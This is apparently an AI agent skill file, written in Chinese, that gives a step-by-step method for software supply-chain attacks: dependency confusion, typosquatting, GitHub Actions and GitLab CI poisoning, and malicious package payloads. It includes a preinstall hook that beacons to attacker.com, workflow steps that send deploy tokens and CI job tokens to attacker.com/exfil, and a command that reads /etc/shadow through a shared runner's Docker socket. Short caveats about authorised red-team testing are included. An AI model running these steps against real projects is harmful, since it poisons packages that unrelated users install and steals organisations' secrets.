---
name: supply-chain-attack
description: "软件供应链攻击方法论。当目标使用 npm/PyPI/Maven 等包管理器、有私有仓库、使用 CI/CD Pipeline 时使用。覆盖 Dependency Confusion、Typosquatting、恶意包发布、CI/CD 投毒、构建服务器攻击"
metadata:
  tags: "supply-chain,dependency confusion,typosquatting,npm,pypi,cicd,pipeline,供应链,依赖混淆"
  category: "exploit"
  mitre_attack: "T1195.001,T1195.002,T1199"
---

# 软件供应链攻击方法论

> **核心思路**：不攻击目标本身，攻击目标信任的上游依赖/构建流程

## ⛔ 深入参考

- Dependency Confusion 详细利用步骤 → [references/dependency-confusion.md](references/dependency-confusion.md)
- CI/CD Pipeline 攻击向量 → [references/cicd-attack.md](references/cicd-attack.md)

---

## 攻击面识别

```
目标使用什么包管理器？
├─ npm (Node.js) → npmjs.com 检查
├─ PyPI (Python) → pypi.org 检查
├─ Maven (Java) → mvnrepository.com 检查
├─ NuGet (.NET) → nuget.org 检查
├─ Go modules → proxy.golang.org
├─ RubyGems → rubygems.org
└─ 容器镜像 → Docker Hub / 私有 Registry

目标有私有仓库？
├─ 是 → Dependency Confusion 首选
└─ 否 → Typosquatting / 已有包投毒
```

## Phase 1: Dependency Confusion（依赖混淆）

### 原理

```
企业内部包: @company/utils (版本 1.0.0, 私有仓库)
攻击者发布: company-utils (版本 99.0.0, 公共 npm)

如果包管理器优先从公共源拉取高版本 → 恶意包被安装
```

### 发现私有包名

```bash
# 1. 从目标网站 JS 中提取包名
curl -s https://target.com | grep -oE "from ['\"]@[a-zA-Z0-9/-]+['\"]"
curl -s https://target.com/main.js | grep -oE "require\(['\"][^'\"]+['\"]\)"

# 2. 从泄露的 package.json / requirements.txt
# GitHub/GitLab 搜索
# 目标开源项目的依赖文件

# 3. DNS 探测（某些私有 npm 使用 DNS CNAME）
dig +short _npmrc.target.com

# 4. 错误信息泄露
# 404 页面可能暴露内部包名
```

### 攻击执行（npm 示例）

```json
// package.json — 恶意包
{
  "name": "target-internal-utils",
  "version": "99.0.0",
  "scripts": {
    "preinstall": "curl https://attacker.com/callback?pkg=$npm_package_name&host=$(hostname)"
  }
}
```

```bash
# 发布到公共 npm
npm publish

# 等待目标 CI/CD 在下次构建时拉取
```

### 各包管理器差异

| 包管理器 | Confusion 条件 | 防御 |
|---------|--------------|------|
| npm | 无 scope(@) 前缀 + 无 .npmrc 锁定 | 使用 @scope + registry 锁定 |
| pip | 无 --index-url 锁定 + 无 --extra-index-url | 使用 --index-url 唯一源 |
| Maven | 无 mirrorOf 配置 | 使用 repository 白名单 |
| NuGet | 多源配置 + 无版本锁定 | 使用 nuget.config 锁定源 |

## Phase 2: Typosquatting（拼写抢注）

```bash
# 生成目标包的相似名称
# crossenv vs cross-env
# electorn vs electron
# cofee-script vs coffee-script

# Python 实现
python3 -c "
import itertools
pkg = 'requests'
typos = []
# 删除一个字符
for i in range(len(pkg)):
    typos.append(pkg[:i] + pkg[i+1:])
# 替换相邻字符
for i in range(len(pkg)-1):
    typos.append(pkg[:i] + pkg[i+1] + pkg[i] + pkg[i+2:])
# 增加常见后缀
typos.extend([pkg+'-python', pkg+'-py', 'python-'+pkg, pkg+'2', pkg+'3'])
print('\n'.join(set(typos)))
"

# 检查哪些名称在公共源上未被注册
# npm: npm view <name> 返回 404 = 可注册
# PyPI: curl -s https://pypi.org/pypi/<name>/json 返回 404 = 可注册
```

## Phase 3: CI/CD Pipeline 攻击

### 攻击向量

```
CI/CD 攻击面：
├─ 代码仓库
│   ├─ PR 注入（恶意 PR 修改 CI 配置）
│   ├─ Branch Protection 绕过
│   └─ Webhook 劫持
│
├─ 构建环境
│   ├─ 构建脚本注入（Makefile/Dockerfile/Jenkinsfile）
│   ├─ 环境变量窃取（secrets in env）
│   ├─ 构建缓存投毒
│   └─ 共享 Runner 逃逸
│
├─ 制品仓库
│   ├─ 镜像替换（tag 覆盖）
│   ├─ 包签名绕过
│   └─ 版本号抢注
│
└─ 部署环节
    ├─ 部署密钥窃取
    ├─ 配置注入（Helm values/Terraform vars）
    └─ 运行时环境变量注入
```

### GitHub Actions 攻击示例

```yaml
# 恶意 PR 中修改 .github/workflows/ci.yml
# 或利用 pull_request_target 事件（在 base 上下文执行，可访问 secrets）
name: CI
on:
  pull_request_target:  # ⛔ 危险：在有 secrets 的上下文执行
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # 检出攻击者代码
      - run: |
          # 窃取仓库 secrets
          curl -X POST https://attacker.com/exfil \
            -d "token=${{ secrets.DEPLOY_TOKEN }}"
```

### GitLab CI/CD 攻击

```yaml
# .gitlab-ci.yml 注入
stages:
  - build

build:
  stage: build
  script:
    # 利用 CI/CD 变量窃取
    - "curl https://attacker.com/exfil?key=$CI_JOB_TOKEN"
    # 或利用共享 Runner 的 Docker socket
    - docker run -v /:/host alpine cat /host/etc/shadow
```

## Phase 4: 恶意包载荷设计

```
安装时回调（验证攻击可达性）：
├─ npm: scripts.preinstall / postinstall
├─ pip: setup.py install（setup() 执行时）
├─ Maven: maven-exec-plugin in pom.xml
└─ Go: init() 函数

⛔ 合法红队测试中：
├─ 只做 DNS/HTTP 回调确认可达
├─ 不窃取实际数据
├─ 不部署持久化
├─ 包中注明"This is a security test"
└─ 及时联系目标安全团队报告
```

## OPSEC 注意事项

```
供应链攻击的法律风险极高：
├─ ⛔ 未授权的 Dependency Confusion 可能构成犯罪
├─ ⛔ Typosquatting 公共包影响非目标用户
├─ ✓ 必须有明确书面授权
├─ ✓ 回调仅收集最小信息（包名+主机名）
├─ ✓ 包描述中注明安全测试
└─ ✓ 测试后立即撤下恶意包
```

